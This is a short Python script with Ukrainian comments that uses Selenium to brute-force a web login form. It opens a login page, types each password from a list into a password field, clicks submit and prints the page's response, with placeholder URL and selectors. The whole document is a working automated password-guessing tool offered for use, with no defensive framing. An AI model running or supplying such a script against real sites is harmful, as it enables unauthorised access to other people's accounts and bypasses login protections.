from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

def brute_force_passwords(passwords, url, input_selector, button_selector, result_selector):
    # Вказуємо шлях до вашого WebDriver (наприклад, для Chrome)
    driver = webdriver.Chrome(executable_path='/path/to/chromedriver')

    # Відкриваємо сторінку
    driver.get(url)

    # Цикл по кожному паролю
    for password in passwords:
        try:
            # Знайти поле для введення паролю
            password_field = driver.find_element(By.CSS_SELECTOR, input_selector)

            # Очистити поле перед введенням нового пароля
            password_field.clear()

            # Ввести пароль
            password_field.send_keys(password)

            # Знайти кнопку та натиснути
            submit_button = driver.find_element(By.CSS_SELECTOR, button_selector)
            submit_button.click()

            # Опціонально: почекати певний час для завантаження результату
            time.sleep(2)  # Можна коригувати час

            # Перевірка результату (наприклад, якщо є поле з результатом після натискання кнопки)
            result = driver.find_element(By.CSS_SELECTOR, result_selector).text
            print(f"Пароль: {password} Результат: {result}")

        except Exception as e:
            print(f"Помилка для паролю {password}: {e}")
        
    # Закриваємо браузер після завершення
    driver.quit()

# Вказуємо паролі, які хочемо перевірити
passwords_list = ['000a', '000b', '000c', '000d']  # Список паролів

# Налаштування URL та селекторів
url = 'https://example.com/login'  # Замість 'example.com' використовуйте свій сайт
input_selector = '#password_input'  # CSS селектор для поля паролю
button_selector = '#submit_button'  # CSS селектор для кнопки
result_selector = '#result_message'  # CSS селектор для результату після введення пароля

# Викликаємо функцію
brute_force_passwords(passwords_list, url, input_selector, button_selector, result_selector)
